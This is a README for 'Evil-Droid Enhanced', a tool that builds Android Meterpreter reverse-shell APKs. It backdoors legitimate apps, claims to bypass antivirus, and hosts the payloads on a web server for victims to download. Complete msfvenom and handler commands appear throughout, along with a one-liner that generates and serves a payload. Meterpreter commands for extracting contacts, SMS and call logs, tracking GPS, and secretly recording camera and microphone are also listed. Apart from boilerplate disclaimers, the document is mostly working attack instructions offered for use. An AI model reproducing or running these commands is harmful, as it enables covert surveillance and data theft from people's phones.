# Evil-Droid Enhanced Framework

> **Advanced Android Penetration Testing Framework - Enhanced & Fixed**

Hello, I am **Hamed Hussein**; A full stack software engineer and ethical hacker. I improved Evil-Droid to fix critical bugs, add new features, and create a seamless user experience for security researchers.

---

## 📋 Table of Contents

- [About The Project](#-about-the-project)
- [What I Fixed & Enhanced](#-what-i-fixed--enhanced)
- [Key Features](#-key-features)
- [Installation](#-installation)
- [Quick Start Guide](#-quick-start-guide)
- [Menu Options](#-menu-options)
- [Meterpreter Commands](#-meterpreter-commands)
- [Troubleshooting](#-troubleshooting)
- [Disclaimer](#-disclaimer)

---

## 🎯 About The Project

Evil-Droid is a comprehensive Android penetration testing framework that allows security researchers to assess Android device security. This enhanced version includes critical bug fixes, a user-friendly interactive menu, and improved functionality.

---

## 🔧 What I Fixed & Enhanced

### 🐛 **Bug Fixes:**

| Issue | Solution |
|-------|----------|
| Permission denied errors | Changed working directory to `/root/evilapk` |
| 'R' parameter breaking msfvenom | Removed the problematic parameter |
| xterm dependency issues | Eliminated xterm requirement |
| Path resolution failures | Fixed all path references |
| APK signing failures | Added automatic signing with keystore |
| Hidden error output | Removed `/dev/null` redirection |

### ✨ **New Features Added:**

- Full interactive menu system with 7 options
- Backdoor injection for existing APKs
- AV bypass with icon change functionality
- Integrated Metasploit listener starter
- APK information viewer with verification
- Color-coded output for better UX
- Auto-copy to web directory

---

## 🚀 Key Features

### **Core Functionality:**

- ✅ Generate custom Meterpreter payloads
- ✅ Inject payloads into legitimate apps
- ✅ Bypass antivirus detection
- ✅ Auto-sign APKs for installation
- ✅ Serve APKs via web server
- ✅ Integrated Metasploit listener

### **Data Collection:**

- 📍 GPS location tracking
- 📱 Contact & SMS extraction
- 🎥 Camera & microphone access
- 📸 Screen capture
- 📞 Call log monitoring
- 🔐 Root detection

---

## 📦 Installation

### **Prerequisites:**

```bash
# Required tools
- Metasploit Framework
- Java JDK (for APK signing)
- Apache2 (web server)
- PostgreSQL (Metasploit DB)
- apktool (APK decompilation)
```

### **Installation Steps:**

```bash
# Install dependencies
sudo apt update
sudo apt install -y metasploit-framework default-jdk apache2 postgresql apktool zipalign

# Clone the repository
git clone https://github.com/yourusername/Evil-Droid.git
cd Evil-Droid

# Make executable
chmod +x evil-droid-enhanced

# Run
./evil-droid-enhanced
```

---

## 🎮 Quick Start Guide

### **1. Generate APK**

```bash
./evil-droid-enhanced
Select option: 1
Enter LHOST: 192.168.1.68
Enter LPORT: 4444
Enter APK name: evilapk
```

### **2. Start Listener**

```bash
# Inside Evil-Droid menu
Select option: 4

# Or manually:
msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.1.68; set LPORT 4444; exploit'
```

### **3. Deploy & Connect**

```bash
# APK is automatically copied to:
/var/www/html/payload.apk

# Download from:
http://192.168.1.68/payload.apk
```

---

## 📋 Menu Options

```
╔══════════════════════════════════════════════════════════╗
║          EVIL-DROID FRAMEWORK v0.4 - ENHANCED           ║
╠══════════════════════════════════════════════════════════╣
║  [1] Generate APK Payload                               ║
║  [2] Backdoor Existing APK                              ║
║  [3] Bypass AV (Icon Change)                            ║
║  [4] Start Listener                                     ║
║  [5] Show APK Info                                      ║
║  [c] Clean Files                                        ║
║  [q] Quit                                               ║
╚══════════════════════════════════════════════════════════╝
```

### **Option Details:**

| Option | Function | Description |
|--------|----------|-------------|
| **1** | Generate APK | Create fresh payload with custom settings |
| **2** | Backdoor APK | Inject payload into existing app |
| **3** | Bypass AV | Obfuscate with icon change |
| **4** | Start Listener | Launch Metasploit handler |
| **5** | APK Info | Verify and display APK details |
| **c** | Clean | Remove all generated files |
| **q** | Quit | Exit framework |

---

## 💻 Meterpreter Commands

### **Session Management:**

```bash
sessions -l           # List active sessions
sessions -i 1         # Interact with session 1
background            # Background current session
```

### **System Information:**

```bash
sysinfo              # Device information
getuid               # Current user
getpid               # Process ID
ps                   # Running processes
check_root           # Check if rooted
```

### **Data Extraction:**

```bash
dump_contacts        # Extract contacts list
dump_sms             # Extract SMS messages
dump_calllog         # Extract call history
geolocate            # Get GPS location
wlan_geolocate       # Get WiFi location
```

### **Surveillance:**

```bash
webcam_list          # List available cameras
webcam_snap          # Take photo
webcam_stream        # Live video stream
record_mic           # Record audio
screenshot           # Take screenshot
```

### **File System:**

```bash
pwd                  # Print working directory
ls                   # List files
cd /sdcard           # Change directory
download <file>      # Download file
upload <file>        # Upload file
```

### **Messaging:**

```bash
send_sms -d <number> -t "message"  # Send SMS
```

---

## 🔧 Troubleshooting

### **Common Issues & Solutions:**

#### **Permission Denied Error:**

```bash
# Solution: Use /root/evilapk directory
mkdir -p /root/evilapk
chmod 777 /root/evilapk
```

#### **APK Signing Failed:**

```bash
# Create keystore
keytool -genkey -v -keystore /root/my-release-key.keystore \
  -alias myalias -keyalg RSA -keysize 2048 -validity 10000 \
  -storepass password123 -keypass password123 \
  -dname "CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"
```

#### **Metasploit Not Found:**

```bash
# Snap installation
snap install metasploit-framework
ln -sf /snap/bin/metasploit-framework.msfvenom /usr/local/bin/msfvenom
ln -sf /snap/bin/metasploit-framework.msfconsole /usr/local/bin/msfconsole
```

#### **Port Already in Use:**

```bash
# Kill process on port 4444
fuser -k 4444/tcp
# Or
kill $(lsof -t -i:4444)
```

#### **Apache Not Serving APK:**

```bash
# Restart Apache
systemctl restart apache2
# Check status
systemctl status apache2
# Check permissions
chmod 644 /var/www/html/payload.apk
```

---

## 🛠️ Advanced Commands

### **Manual APK Generation:**

```bash
# Generate
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.68 LPORT=4444 \
  -a dalvik --platform android -o evilapk.apk

# Sign
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
  -keystore /root/my-release-key.keystore \
  -storepass password123 evilapk.apk myalias

# Verify
jarsigner -verify evilapk.apk
```

### **One-Liner Workflow:**

```bash
cd /root && \
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.68 LPORT=4444 -o evilapk.apk && \
jarsigner -keystore /root/my-release-key.keystore -storepass password123 evilapk.apk myalias && \
cp evilapk.apk /var/www/html/payload.apk && \
systemctl start apache2 && \
echo "✅ APK Ready: http://192.168.1.68/payload.apk"
```

---

## 📁 File Structure

```
Evil-Droid/
├── evil-droid-enhanced    # Main script (enhanced version)
├── evil-droid             # Original script
├── README.md              # Documentation
├── tools/
│   └── apktool.jar        # APK decompilation tool
├── evilapk/               # Output directory (/root/evilapk)
├── icons/                 # Icon resources
└── testapks/              # Test APK files
```

---

## 🛡️ Security Considerations

- 🔒 **Use Only for Authorized Testing**
- 🔐 **Get Written Permission Before Testing**
- 📋 **Follow All Applicable Laws**
- 🛡️ **Responsible Disclosure**
- 📊 **Document All Tests**

---

## 📝 License

This project is for **educational and authorized security testing purposes only**.

- ⚠️ **Unauthorized use is illegal**
- ⚠️ **Use only on systems you own or have permission to test**
- ⚠️ **The developer assumes no liability for misuse**

---

## 🏆 Credits

- **Original Author**: Mascerano Bachir
- **Enhanced By**: Hamed Hussein (Tech Sky - SRT)
- **Contributors**: Open Source Community

---

## 📱 Connect With Me

- **GitHub**: [hamedhussein](https://github.com/hamedhussein)
- **LinkedIn**: [Hamed Hussein](https://linkedin.com/in/hamedhussein)
- **Website**: [hamedhussein.com](https://hamedhussein.com)

---

## ⭐ Support

If you find this tool useful, please ⭐ star the repository!

---

## 📊 Quick Reference Card

```bash
# Run Framework
./evil-droid-enhanced

# Menu Options
1 - Generate APK   2 - Backdoor APK    3 - Bypass AV
4 - Start Listener 5 - APK Info        c - Clean
q - Quit

# Generate & Sign
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -o payload.apk
jarsigner -keystore my.keystore -storepass password payload.apk alias

# Start Listener
msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST IP; set LPORT PORT; exploit'

# Meterpreter Commands
sessions -i 1
dump_contacts | dump_sms | dump_calllog | geolocate
webcam_snap | screenshot | record_mic
```

---

**⚠️ Remember: Use responsibly and legally!**

---

*Last Updated: December 2025*  
*Version: v0.4-Enhanced*  
*Status: ✅ Fully Functional*
